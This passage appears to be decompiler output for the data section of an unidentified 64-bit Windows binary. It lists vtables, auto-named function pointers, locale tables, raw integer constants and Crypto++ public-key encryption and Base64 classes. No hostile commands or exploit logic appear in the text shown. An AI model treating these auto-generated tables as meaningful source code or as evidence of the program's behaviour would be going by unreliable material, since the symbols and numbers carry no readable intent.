  &sub_13F157050,
  &sub_13F1565FC,
  &sub_13F1560A0,
  &sub_13F15651C,
  &sub_13F156F6C,
  &guard_check_icall_nop,
  &Concurrency::details::ThreadInternalContext::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18C100[19])() =
{
  &sub_13F156A98,
  &sub_13F156AC0,
  &sub_13F14E9B8,
  &sub_13F1575D4,
  &sub_13F156CC8,
  &sub_13F15A61C,
  &sub_13F15634C,
  &sub_13F1578DC,
  &sub_13F1570C0,
  &sub_13F156E7C,
  &sub_13F1562DC,
  &sub_13F156A30,
  &sub_13F14E82C,
  &sub_13F14E838,
  &sub_13F14E844,
  &sub_13F14E850,
  &sub_13F14E98C,
  &sub_13F1021E0,
  &Concurrency::details::ThreadScheduler::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18C198[8])() =
{
  &sub_13F15A7D4,
  &loc_13F15A81C,
  &sub_13F15A7E8,
  &sub_13F15A6CC,
  &loc_13F15A810,
  &guard_check_icall_nop,
  &guard_check_icall_nop,
  &Concurrency::details::ThreadScheduler::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18C1D8[24])() =
{
  &sub_13F15A628,
  &sub_13F14A2FC,
  &sub_13F1451AC,
  &sub_13F15A804,
  &sub_13F14B1A0,
  &sub_13F14B36C,
  &sub_13F14B22C,
  &sub_13F14891C,
  &sub_13F1490E8,
  &sub_13F1490F0,
  &sub_13F14BC10,
  &sub_13F14BB98,
  &sub_13F14AB18,
  &sub_13F15A7CC,
  &sub_13F14BCC8,
  &sub_13F14B0D8,
  &sub_13F15A714,
  &guard_check_icall_nop,
  &sub_13F14C4BC,
  &sub_13F14A880,
  &sub_13F1491F8,
  &sub_13F148A50,
  &sub_13F1021D0,
  &sub_13F15A780
}; // weak
void *Concurrency::details::VirtualProcessorRoot::`vftable' = &sub_13F15B3DC; // weak
__int64 (__fastcall *off_13F18C438[10])() =
{
  &sub_13F15B3DC,
  &sub_13F15B3D4,
  &sub_13F15B3E0,
  &sub_13F15B3C8,
  &sub_13F15B3D8,
  &sub_13F15B504,
  &sub_13F15B6DC,
  &sub_13F15B890,
  &sub_13F15B4CC,
  &sub_13F15B7F8
}; // weak
void *Concurrency::details::ThreadProxy::`vftable' = &sub_13F15BE04; // weak
__int64 (__fastcall *off_13F18C550[10])() =
{
  &sub_13F15DE3C,
  &sub_13F1024C0,
  &sub_13F1024C0,
  &sub_13F154E70,
  &sub_13F1544AC,
  &sub_13F1551E8,
  &sub_13F1547C4,
  &sub_13F155068,
  &sub_13F154C44,
  NULL
}; // weak
__int64 qword_13F18C5A0[3] = { 6442450985i64, 0i64, 0i64 }; // weak
__int64 qword_13F18C5D8[] = { 0i64 }; // weak
__int64 qword_13F18C610[] = { 0i64 }; // weak
void *std::bad_typeid::`vftable' = &sub_13F101480; // weak
__int64 (__fastcall *off_13F18C6A0[2])() = { &sub_13F101480, &sub_13F101460 }; // weak
void *std::bad_exception::`vftable' = &sub_13F101480; // weak
char *off_13F18C730[13] =
{
  "__pascal",
  "__stdcall",
  "__thiscall",
  "__fastcall",
  "__vectorcall",
  "__clrcall",
  "__eabi",
  "__swift_1",
  "__swift_2",
  "__ptr64",
  "__restrict",
  "__unaligned",
  "restrict("
}; // weak
char *off_13F18C7C0 = "<<"; // weak
char *off_13F18CA30[2] = { " Type Descriptor'", " Base Class Descriptor at (" }; // weak
char byte_13F18CB88 = '%'; // weak
__int64 qword_13F18CBA8 = 532575944798i64; // weak
__int64 qword_13F18CBB0[13] =
{
  136872017798694i64,
  67254892903722i64,
  67272072772909i64,
  17238409588260133i64,
  67233422064700i64,
  67473936235900i64,
  7308324466019694176i64,
  39i64,
  7308324466019432032i64,
  39i64,
  11096736837891680i64,
  2839079096573064288i64,
  0i64
}; // weak
void *charNode::`vftable' = &sub_13F1021E0; // weak
__int64 (__fastcall *off_13F18D590[4])() =
{
  &sub_13F16767C,
  &sub_13F164B48,
  &sub_13F166284,
  &pDNameNode::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18D5B0[8])() =
{
  &sub_13F167600,
  &sub_13F164AE4,
  &sub_13F166208,
  &DNameStatusNode::`RTTI Complete Object Locator',
  &sub_13F1675FC,
  &sub_13F164AD4,
  &sub_13F1661AC,
  &pairNode::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18D5F0[3])() = { &sub_13F167628, &sub_13F164B10, &sub_13F166238 }; // weak
__int64 qword_13F18D610[2] = { 5353559504i64, 0i64 }; // weak
__int64 qword_13F18D620[4] = { 5353559504i64, 17179869185i64, 5353559504i64, 2i64 }; // weak
__int64 qword_13F18D640[2] = { 5353559504i64, 3i64 }; // weak
wchar_t *off_13F18D650[2] = { L"api-ms-win-core-fibers-l1-1-1", L"api-ms-win-core-synch-l1-2-0" }; // weak
__int64 qword_13F18D720 = 8589934592i64; // weak
__int64 qword_13F18D728 = 8589934592i64; // weak
__int64 qword_13F18D730 = 8589934592i64; // weak
__int64 qword_13F18D738 = 8589934592i64; // weak
__int64 qword_13F18D740 = 8589934593i64; // weak
__int64 qword_13F18D748 = 0i64; // weak
__int64 qword_13F18D750[12] =
{
  1099612291078i64,
  1153491051730894864i64,
  361700865268335876i64,
  343600542981i64,
  578528178702657536i64,
  2058660237817600i64,
  30201094144i64,
  27127564814802952i64,
  610370208320747520i64,
  578712582182340615i64,
  504411984557506568i64,
  458760i64
}; // weak
__int64 qword_13F18D7B0[8] =
{
  36171186031329286i64,
  -9186632403320107008i64,
  -8825571730949602028i64,
  5800689302769763717i64,
  4046246770815043712i64,
  3474245667612809040i64,
  2305843041565429808i64,
  551912243240i64
}; // weak
__int64 qword_13F18D830[45] =
{
  94489280513i64,
  8589934594i64,
  8589934595i64,
  103079215108i64,
  55834574853i64,
  38654705670i64,
  51539607559i64,
  51539607560i64,
  51539607561i64,
  30064771082i64,
  34359738379i64,
  94489280524i64,
  94489280525i64,
  8589934607i64,
  55834574864i64,
  77309411345i64,
  8589934610i64,
  55834574881i64,
  8589934645i64,
  55834574913i64,
  8589934659i64,
  73014444112i64,
  55834574930i64,
  55834574931i64,
  94489280599i64,
  47244640345i64,
  55834574956i64,
  137438953581i64,
  120259084400i64,
  38654705778i64,
  94489280518i64,
  42949673088i64,
  42949673089i64,
  38654705794i64,
  94489280643i64,
  55834574980i64,
  176093659281i64,
  55834575006i64,
  8589934753i64,
  47244640420i64,
  55834575015i64,
  73014444215i64,
  8589934798i64,
  47244640471i64,
  51539609368i64
}; // weak
__int64 qword_13F18EF80[2] = { 50465865733i64, 0i64 }; // weak
__int64 (__fastcall *off_13F18F060[2])() = { &sub_13F16CFC0, NULL }; // weak
char byte_13F18F150[4] = { '\x01', '\0', '\0', '\0' }; // weak
wchar_t *off_13F18F260[2] = { L"api-ms-win-appmodel-runtime-l1-1-1", L"api-ms-win-core-datetime-l1-1-1" }; // weak
__int64 qword_13F18F858 = 77309411330i64; // weak
__int64 qword_13F18F870 = 77309411330i64; // weak
__int64 qword_13F18F880 = 77309411330i64; // weak
__int64 qword_13F18F898 = 77309411330i64; // weak
__int64 qword_13F18F8B0 = 60129542144i64; // weak
__int64 qword_13F18F918 = 77309411332i64; // weak
__int64 qword_13F18F930 = 77309411332i64; // weak
__int64 qword_13F18F9B0[121] =
{
  5353569392i64,
  5353569396i64,
  5353569400i64,
  5353569404i64,
  5353569408i64,
  5353569412i64,
  5353569416i64,
  5353569420i64,
  5353569428i64,
  5353569440i64,
  5353569448i64,
  5353569464i64,
  5353569476i64,
  5353569488i64,
  5353569500i64,
  5353569504i64,
  5353569508i64,
  5353569512i64,
  5353569516i64,
  5353569520i64,
  5353569524i64,
  5353569528i64,
  5353569532i64,
  5353569536i64,
  5353569540i64,
  5353569544i64,
  5353569552i64,
  5353569560i64,
  5353569572i64,
  5353569580i64,
  5353569516i64,
  5353569588i64,
  5353569596i64,
  5353569604i64,
  5353569616i64,
  5353569632i64,
  5353569640i64,
  5353569656i64,
  5353569668i64,
  5353569672i64,
  5353569680i64,
  5353569696i64,
  5353569720i64,
  1i64,
  5353569736i64,
  5353569744i64,
  5353569752i64,
  5353569760i64,
  5353569768i64,
  5353569776i64,
  5353569784i64,
  5353569792i64,
  5353569808i64,
  5353569824i64,
  5353569840i64,
  5353569864i64,
  5353569888i64,
  5353569904i64,
  5353569928i64,
  5353569936i64,
  5353569944i64,
  5353569952i64,
  5353569960i64,
  5353569968i64,
  5353569976i64,
  5353569984i64,
  5353569992i64,
  5353570000i64,
  5353570008i64,
  5353570016i64,
  5353570024i64,
  5353570040i64,
  5353570064i64,
  5353570080i64,
  5353569960i64,
  5353570096i64,
  5353570112i64,
  5353570128i64,
  5353570144i64,
  5353570168i64,
  5353570184i64,
  5353570208i64,
  5353570228i64,
  5353570236i64,
  5353570248i64,
  5353570272i64,
  5353570312i64,
  5353570336i64,
  31084623948576083i64,
  28258922014274900i64,
  29680517535590484i64,
  7236850650581328211i64,
  7236844027734161761i64,
  31073i64,
  34165556242642260i64,
  7017860998831039831i64,
  121i64,
  8746382398334527572i64,
  7235439921320689664i64,
  31073i64,
  8746382394089824595i64,
  31069217893646336i64,
  32195130691839302i64,
  34165455529865281i64,
  30528258180019530i64,
  31636604555064641i64,
  33336428057617231i64,
  6513988i64,
  34184235089551690i64,
  8751164182992414022i64,
  7165896940440256512i64,
  7598258945802633320i64,
  7308908205956923500i64,
  8749497136762060800i64,
  8459859347072090112i64,
  29811i64,
  7305521828061013331i64,
  114i64,
  32199620796113743i64,
  8243102914964778830i64,
  0i64
}; // weak
wchar_t asc_13F190140[33] = L"         (((((                  H"; // weak
__int64 qword_13F190640 = 0i64; // weak
__int64 qword_13F1922E0[64] =
{
  4607182418800017408i64,
  4607231459784622177i64,
  4607281034790536564i64,
  4607331149632871368i64,
  4607381810190059791i64,
  4607433022404546978i64,
  4607484792283487057i64,
  4607537125899447776i64,
  4607590029391122811i64,
  4607643508964051829i64,
  4607697570891348394i64,
  4607752221514435798i64,
  4607807467243790904i64,
  4607863314559696093i64,
  4607919770012999393i64,
  4607976840225882891i64,
  4608034531892639509i64,
  4608092851780458239i64,
  4608151806730217931i64,
  4608211403657289719i64,
  4608271649552348194i64,
  4608332551482191402i64,
  4608394116590569773i64,
  4608456352099024080i64,
  4608519265307732519i64,
  4608582863596367015i64,
  4608647154424958850i64,
  4608712145334773722i64,
  4608777843949196329i64,
  4608844257974624584i64,
  4608911395201373573i64,
  4608979263504589349i64,
  4609047870845172685i64,
  4609117225270712879i64,
  4609187334916431732i64,
  4609258208006137801i64,
  4609329852853191047i64,
  4609402277861477986i64,
  4609475491526397459i64,
  4609549502435857133i64,
  4609624319271280859i64,
  4609699950808626998i64,
  4609776405919417829i64,
  4609853693571780176i64,
  4609931822831497360i64,
  4610010802863072613i64,
  4610090642930804061i64,
  4610171352399871423i64,
  4610252940737434541i64,
  4610335417513743867i64,
  4610418792403263047i64,
  4610503075185803730i64,
  4610588275747672732i64,
  4610674404082831691i64,
  4610761470294069353i64,
  4610849484594186620i64,
  4610938457307194503i64,
  4611028398869525125i64,
  4611119319831255903i64,
  4611211230857347062i64,
  4611304142728892634i64,
  4611398066344385063i64,
  4611493012720993600i64,
  4611588992995856600i64
}; // weak
__int64 qword_13F1924E0[512] =
{
  1i64,
  5353583392i64,
  2i64,
  5353583400i64,
  3i64,
  5353583408i64,
  4i64,
  5353583416i64,
  5i64,
  5353583432i64,
  6i64,
  5353583440i64,
  7i64,
  5353583448i64,
  8i64,
  5353583456i64,
  9i64,
  5353583464i64,
  10i64,
  5353583472i64,
  11i64,
  5353583480i64,
  12i64,
  5353583488i64,
  13i64,
  5353583496i64,
  14i64,
  5353583504i64,
  15i64,
  5353583512i64,
  16i64,
  5353583520i64,
  17i64,
  5353583528i64,
  18i64,
  5353583536i64,
  19i64,
  5353583544i64,
  20i64,
  5353583552i64,
  21i64,
  5353583560i64,
  22i64,
  5353583568i64,
  24i64,
  5353583576i64,
  25i64,
  5353583584i64,
  26i64,
  5353583592i64,
  27i64,
  5353583600i64,
  28i64,
  5353583608i64,
  29i64,
  5353583616i64,
  30i64,
  5353583624i64,
  31i64,
  5353583632i64,
  32i64,
  5353583640i64,
  33i64,
  5353583648i64,
  34i64,
  5353579220i64,
  35i64,
  5353583656i64,
  36i64,
  5353583664i64,
  37i64,
  5353583672i64,
  38i64,
  5353583680i64,
  39i64,
  5353583688i64,
  41i64,
  5353583696i64,
  42i64,
  5353583704i64,
  43i64,
  5353583712i64,
  44i64,
  5353583720i64,
  45i64,
  5353583728i64,
  47i64,
  5353583736i64,
  54i64,
  5353583744i64,
  55i64,
  5353583752i64,
  56i64,
  5353583760i64,
  57i64,
  5353583768i64,
  62i64,
  5353583776i64,
  63i64,
  5353583784i64,
  64i64,
  5353583792i64,
  65i64,
  5353583800i64,
  67i64,
  5353583808i64,
  68i64,
  5353583816i64,
  70i64,
  5353583824i64,
  71i64,
  5353583832i64,
  73i64,
  5353583840i64,
  74i64,
  5353583848i64,
  75i64,
  5353583856i64,
  78i64,
  5353583864i64,
  79i64,
  5353583872i64,
  80i64,
  5353583880i64,
  86i64,
  5353583888i64,
  87i64,
  5353583896i64,
  90i64,
  5353583904i64,
  101i64,
  5353583912i64,
  127i64,
  5353583920i64,
  1025i64,
  5353583928i64,
  1026i64,
  5353583944i64,
  1027i64,
  5353583960i64,
  1028i64,
  5353579208i64,
  1029i64,
  5353583976i64,
  1030i64,
  5353583992i64,
  1031i64,
  5353584008i64,
  1032i64,
  5353584024i64,
  1033i64,
  5353570336i64,
  1035i64,
  5353584040i64,
  1036i64,
  5353584056i64,
  1037i64,
  5353584072i64,
  1038i64,
  5353584088i64,
  1039i64,
  5353584104i64,
  1040i64,
  5353584120i64,
  1041i64,
  5353579160i64,
  1042i64,
  5353579192i64,
  1043i64,
  5353584136i64,
  1044i64,
  5353584152i64,
  1045i64,
  5353584168i64,
  1046i64,
  5353584184i64,
  1048i64,
  5353584200i64,
  1049i64,
  5353584216i64,
  1050i64,
  5353584232i64,
  1051i64,
  5353584248i64,
  1052i64,
  5353584264i64,
  1053i64,
  5353584280i64,
  1054i64,
  5353584296i64,
  1055i64,
  5353584312i64,
  1056i64,
  5353584328i64,
  1057i64,
  5353584344i64,
  1058i64,
  5353584360i64,
  1059i64,
  5353584376i64,
  1060i64,
  5353584392i64,
  1061i64,
  5353584408i64,
  1062i64,
  5353584424i64,
  1063i64,
  5353584440i64,
  1065i64,
  5353584456i64,
  1066i64,
  5353584472i64,
  1067i64,
  5353584488i64,
  1068i64,
  5353584504i64,
  1069i64,
  5353584528i64,
  1071i64,
  5353584544i64,
  1074i64,
  5353584560i64,
  1076i64,
  5353584576i64,
  1077i64,
  5353584592i64,
  1078i64,
  5353584608i64,
  1079i64,
  5353584624i64,
  1080i64,
  5353584640i64,
  1081i64,
  5353584656i64,
  1082i64,
  5353584672i64,
  1083i64,
  5353584688i64,
  1086i64,
  5353584704i64,
  1087i64,
  5353584720i64,
  1088i64,
  5353584736i64,
  1089i64,
  5353584752i64,
  1091i64,
  5353584768i64,
  1092i64,
  5353584792i64,
  1093i64,
  5353584808i64,
  1094i64,
  5353584824i64,
  1095i64,
  5353584840i64,
  1097i64,
  5353584856i64,
  1098i64,
  5353584872i64,
  1099i64,
  5353584888i64,
  1100i64,
  5353584904i64,
  1102i64,
  5353584920i64,
  1103i64,
  5353584936i64,
  1104i64,
  5353584952i64,
  1106i64,
  5353584968i64,
  1110i64,
  5353584984i64,
  1111i64,
  5353585000i64,
  1114i64,
  5353585016i64,
  1125i64,
  5353585032i64,
  1131i64,
  5353585048i64,
  1132i64,
  5353585064i64,
  1153i64,
  5353585080i64,
  2049i64,
  5353585096i64,
  2052i64,
  5353579176i64,
  2055i64,
  5353585112i64,
  2057i64,
  5353585128i64,
  2058i64,
  5353585144i64,
  2060i64,
  5353585160i64,
  2064i64,
  5353585176i64,
  2067i64,
  5353585192i64,
  2068i64,
  5353585208i64,
  2070i64,
  5353585224i64,
  2074i64,
  5353585240i64,
  2077i64,
  5353585264i64,
  2092i64,
  5353585280i64,
  2107i64,
  5353585304i64,
  2110i64,
  5353585320i64,
  2115i64,
  5353585336i64,
  2155i64,
  5353585360i64,
  3073i64,
  5353585376i64,
  3076i64,
  5353585392i64,
  3079i64,
  5353585408i64,
  3081i64,
  5353585424i64,
  3082i64,
  5353585440i64,
  3084i64,
  5353585456i64,
  3098i64,
  5353585472i64,
  3131i64,
  5353585496i64,
  3179i64,
  5353585512i64,
  4097i64,
  5353585528i64,
  4100i64,
  5353585544i64,
  4103i64,
  5353585560i64,
  4105i64,
  5353585576i64,
  4106i64,
  5353585592i64,
  4108i64,
  5353585608i64,
  4122i64,
  5353585624i64,
  4155i64,
  5353585640i64,
  5121i64,
  5353585656i64,
  5124i64,
  5353585672i64,
  5127i64,
  5353585688i64,
  5129i64,
  5353585704i64,
  5130i64,
  5353585720i64,
  5132i64,
  5353585736i64,
  5146i64,
  5353585752i64,
  5179i64,
  5353585776i64,
  6145i64,
  5353585792i64,
  6153i64,
  5353585808i64,
  6154i64,
  5353585824i64,
  6156i64,
  5353585840i64,
  6170i64,
  5353585856i64,
  6203i64,
  5353585880i64,
  7169i64,
  5353585896i64,
  7177i64,
  5353585912i64,
  7178i64,
  5353585928i64,
  7194i64,
  5353585944i64,
  7227i64,
  5353585968i64,
  8193i64,
  5353585984i64,
  8201i64,
  5353586000i64,
  8202i64,
  5353586016i64,
  8251i64,
  5353586032i64,
  9217i64,
  5353586048i64,
  9225i64,
  5353586064i64,
  9226i64,
  5353586080i64,
  9275i64,
  5353586096i64,
  10241i64,
  5353586112i64,
  10249i64,
  5353586128i64,
  10250i64,
  5353586144i64,
  11265i64,
  5353586160i64,
  11273i64,
  5353586176i64,
  11274i64,
  5353586192i64,
  12289i64,
  5353586208i64,
  12297i64,
  5353586224i64,
  12298i64,
  5353586240i64,
  13313i64,
  5353586256i64,
  13321i64,
  5353586272i64,
  13322i64,
  5353586288i64,
  14337i64,
  5353586304i64,
  14346i64,
  5353586320i64,
  15361i64,
  5353586336i64,
  15370i64,
  5353586352i64,
  16385i64,
  5353586368i64,
  16394i64,
  5353586384i64,
  17418i64,
  5353586400i64,
  18442i64,
  5353586416i64,
  19466i64,
  5353586432i64,
  20490i64,
  5353586448i64,
  31748i64,
  5353586464i64,
  31770i64,
  5353586480i64,
  7471201i64,
  6750306i64,
  6357091i64,
  18859016719958138i64,
  5439560i64,
  7536739i64,
  6357092i64,
  6619236i64,
  7077989i64,
  7209061i64,
  7536741i64,
  6881382i64,
  7471206i64,
  6619240i64,
  7667816i64,
  7536745i64,
  7602281i64,
  6357098i64,
  7274603i64,
  7077998i64,
  7274606i64,
  7078000i64,
  7602288i64,
  7274610i64,
  7667826i64,
  7471208i64,
  7012467i64,
  7405683i64,
  7733363i64,
  6815860i64,
  7471220i64,
  7471221i64,
  6553705i64,
  6619234i64,
  7078003i64,
  7602277i64,
  7733356i64,
  7602284i64,
  6357094i64,
  6881398i64,
  7929960i64,
  7995489i64,
  7667813i64,
  7012461i64,
  6684769i64,
  6357099i64,
  7274598i64,
  6881384i64,
  7536749i64,
  7012459i64,
  7929963i64,
  7798899i64,
  7995509i64,
  7602292i64,
  6357104i64,
  7667815i64
}; // weak
__int64 qword_13F193F40[8] =
{
  5353583920i64,
  66i64,
  5353583744i64,
  44i64,
  5353590144i64,
  113i64,
  5353583392i64,
  0i64
}; // weak
__int64 qword_13F1957E0[123] =
{
  10000000000i64,
  7766279631452241920i64,
  4611686018427387909i64,
  -6977029304354542102i64,
  -5047021154770878452i64,
  7145508105175220139i64,
  -5376172055173529571i64,
  -7897475557246028547i64,
  293873587705i64,
  -7753631921497702400i64,
  -7340228568449662420i64,
  684227765783i64,
  2618431695511421504i64,
  8343038602174441244i64,
  1593091911132i64,
  7179344069900959744i64,
  -3615973622937282358i64,
  -7067768360529825936i64,
  -2017612633061981345i64,
  7402805540348493422i64,
  6504607449490202418i64,
  -4340825355694442459i64,
  -6327963127526717478i64,
  -8205247923350256888i64,
  -8879746014541853120i64,
  -5970202163674412249i64,
  -2514627073188818359i64,
  -2568914636038515494i64,
  -791151337858618453i64,
  -308585279210645913i64,
  46816763546921i64,
  1710112268215123968i64,
  452505837226659492i64,
  -9161342124735876554i64,
  -6300859955700389366i64,
  109003771904208i64,
  -8982491483864287132i64,
  -2762639092577844523i64,
  -7933667494416609219i64,
  -1432806528442100364i64,
  253794183731564i64,
  7948678911314169856i64,
  310996984586250857i64,
  7156263711850443819i64,
  -8193480288550424167i64,
  1894166541692841512i64,
  3620894100406016366i64,
  -495833220962762714i64,
  7375715018489516501i64,
  7348324124281482902i64,
  -5755421535164804180i64,
  5446019269101877587i64,
  -305350317656710323i64,
  -5255937914677571340i64,
  -2575473963604643085i64,
  -551381330861400707i64,
  -8740619542430861284i64,
  1348826308043700153i64,
  2094705990355870058i64,
  4221032974508058509i64,
  -4796218117467851125i64,
  -7266904434574727746i64,
  -7127780466833758051i64,
  -4735445864234683861i64,
  7458340731200206i64,
  213802753578762240i64,
  -5696951271691684672i64,
  -2100444252791388555i64,
  8586195481066959583i64,
  5855684204766355478i64,
  -2962617222631667249i64,
  17365302730352167i64,
  -798034016631521280i64,
  6344003720113785072i64,
  -563691285114846097i64,
  -387211587165812664i64,
  1814569393333792808i64,
  9036829477075055008i64,
  8726382460578393601i64,
  -5065739240712723339i64,
  -3657179549595568836i64,
  621083188486486635i64,
  -154347189994437306i64,
  3488297481490699153i64,
  -5295879193774242777i64,
  -2780882672895735101i64,
  94137494730581410i64,
  -983328540543680512i64,
  36227884126809359i64,
  -2898678998103378586i64,
  -3623342589769454211i64,
  -5253940181364543266i64,
  -2890163515399550386i64,
  -456200696023205232i64,
  219180934900840303i64,
  696744236569067520i64,
  6224298816108779730i64,
  8469006735839626119i64,
  4728858563865536630i64,
  -6865167815242414690i64,
  -2163205195804194584i64,
  2603219883009328306i64,
  -1965546901387205261i64,
  8807741523389384110i64,
  5756234964498931023i64,
  -1921291075997176467i64,
  2948687425217565526i64,
  2182340880274746244i64,
  -7589348085766083154i64,
  5683206122601369297i64,
  -5590834514899713914i64,
  1188182228934474889i64,
  7932890800474619904i64,
  -1215257582233276841i64,
  1720920298227956701i64,
  4013983252093517298i64,
  1850098264510573630i64,
  3890945489884177416i64,
  4673532535611222542i64,
  7724407183888759754i64,
  2766452331409032665i64,
  -324153667768811520i64,
  -7256951939645714001i64
}; // weak
__int16 word_13F1960F0[] = { 0 }; // weak
char byte_13F1960F2[] = { '\0' }; // weak
char byte_13F1960F3[] = { '\x02' }; // weak
int dword_13F196188[] = { 10 }; // weak
int dword_13F1961AC = 48; // weak
void *std::_Ref_count_obj_alloc<__ExceptionPtr,_StaticAllocator<int>>::`vftable' = &sub_13F1789EC; // weak
void *std::_Ref_count_obj<__ExceptionPtr>::`vftable' = &sub_13F1789EC; // weak
__int64 (__fastcall *off_13F197648[5])() =
{
  &sub_13F178FE4,
  &sub_13F179040,
  &loc_13F178FC8,
  &sub_13F178FB0,
  &guard_check_icall_nop
}; // weak
__int64 (__fastcall *off_13F197678[6])() =
{
  &sub_13F179008,
  &sub_13F17905C,
  &loc_13F178FC8,
  &sub_13F178FB0,
  &guard_check_icall_nop,
  &Concurrency::details::stl_condition_variable_concrt::`RTTI Complete Object Locator'
}; // weak
void *off_13F1976A8[5] =
{
  &loc_13F178FD4,
  &sub_13F179030,
  &sub_13F178FBC,
  &sub_13F178FA4,
  &sub_13F178EB0
}; // weak
void *CryptoPP::BaseN_Encoder::`vftable' = &sub_13F103AA0; // weak
void *off_13F19B598[3] = { &loc_13F108434, &sub_13F1103A0, &sub_13F110450 }; // weak
__int64 qword_13F19B5B0 = 39i64; // weak
void *CryptoPP::PK_EncryptorFilter::`vftable' = &sub_13F1030D0; // weak
__int64 (__fastcall *off_13F19BB88[61])() =
{
  &sub_13F1030D0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F102F80,
  &sub_13F102FA0,
  &sub_13F111BC0,
  &sub_13F1299E0,
  &sub_13F102490,
  &sub_13F1298B0,
  &sub_13F1295C0,
  &sub_13F129C10,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F102FC0,
  &sub_13F102FD0,
  &sub_13F102FE0,
  &sub_13F102FF0,
  &sub_13F103000,
  &guard_check_icall_nop,
  &guard_check_icall_nop,
  &guard_check_icall_nop,
  &sub_13F129DE0,
  &sub_13F129D60,
  &sub_13F103140,
  &guard_check_icall_nop,
  &sub_13F1024C0
}; // weak
__int64 qword_13F19BD70[4] = { 2164663517184i64, 3i64, 3977023946111989040i64, 0i64 }; // weak
__int64 qword_13F19BE58[2] = { 446676598784i64, 5353665016i64 }; // weak
__int64 (__fastcall *off_13F19BE68[49])() =
{
  &sub_13F103BC0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F12F060,
  &sub_13F1024A0,
  &sub_13F12E9B0,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F1298B0,
  &sub_13F1295C0,
  &sub_13F129C10,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &CryptoPP::Base64Encoder::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F19BFF0[3])() = { &sub_13F1083EC, &sub_13F1103A0, &sub_13F110450 }; // weak
__int64 qword_13F19C008[2] = { 1619202670584i64, 5353664960i64 }; // weak
__int64 (__fastcall *off_13F19C018[4])() =
{
  &sub_13F1083EC,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::BaseN_Encoder::`RTTI Complete Object Locator'
}; // weak
void *off_13F19C038[3] = { &loc_13F108470, &sub_13F1103A0, &sub_13F110450 }; // weak
char byte_13F19C050[4] = { '\0', '\0', '\0', '\0' }; // weak
__int128 xmmword_13F19CCB0 = 0x0FFFFFFFFFFFFFFFFi64; // weak
__int128 xmmword_13F19CCC0 = 0xF0000000000000000i64; // weak
__int128 xmmword_13F19CCD0 = 0x42424242424242424242424242424242i64; // weak
__int64 qword_13F1A77C0[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1A77D0 = 0i64; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, 5184, 0, 738176 }; // idb
const _ThrowInfo _TI3_AVinvalid_argument_std__ = { 0u, 5184, 0, 738272 }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, 5184, 0, 738416 }; // idb
const _ThrowInfo _TI3_AVout_of_range_std__ = { 0u, 5184, 0, 738520 }; // idb
const _ThrowInfo _TI4_AVsystem_error_std__ = { 0u, 5184, 0, 738664 }; // idb
const _ThrowInfo _TI2_AVbad_cast_std__ = { 0u, 5184, 0, 738816 }; // idb
const _ThrowInfo _TI4_AVBERDecodeErr_CryptoPP__ = { 0u, 5712, 0, 738912 }; // idb
const _ThrowInfo _TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__ = { 0u, 5712, 0, 739024 }; // idb
const _ThrowInfo _TI3_AVSelfTestFailure_CryptoPP__ = { 0u, 5712, 0, 739176 }; // idb
const _ThrowInfo _TI4_AVInvalidKeyLength_CryptoPP__ = { 0u, 5712, 0, 739280 }; // idb
const _ThrowInfo _TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__ = { 0u, 5712, 0, 739392 }; // idb
const _ThrowInfo _TI4_AVInvalidCiphertext_CryptoPP__ = { 0u, 5712, 0, 739504 }; // idb
const _ThrowInfo _TI3_AVRandomNumberNotFound_Integer_CryptoPP__ = { 0u, 5712, 0, 739616 }; // idb
const _ThrowInfo _TI3_AVDivideByZero_Integer_CryptoPP__ = { 0u, 5712, 0, 739720 }; // idb
const _ThrowInfo _TI2_AVException_CryptoPP__ = { 0u, 5344, 0, 739824 }; // idb
const _ThrowInfo _TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__ = { 0u, 5712, 0, 739880 }; // idb
const _ThrowInfo _TI4_AVHashInputTooLong_CryptoPP__ = { 0u, 5712, 0, 739992 }; // idb
